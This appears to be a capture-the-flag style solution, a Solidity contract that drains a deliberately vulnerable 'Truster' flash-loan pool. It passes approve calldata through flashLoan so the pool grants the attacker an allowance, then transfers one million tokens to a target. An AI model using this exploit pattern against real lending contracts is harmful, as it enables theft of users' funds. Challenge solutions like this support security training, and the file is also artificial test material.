pragma solidity =0.8.25;

import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";

contract ExploitContract {
    TrusterLenderPool public immutable pool;
    ERC20 public immutable token;

    constructor(TrusterLenderPool pool, ERC20 token, address target) {
        bytes memory data = abi.encodeWithSelector(ERC20.approve.selector, address(this), 1_000_000e18);
        pool.flashLoan(0, address(this), address(token), data);

        token.transferFrom(address(pool), target, 1_000_000e18);
    }
}
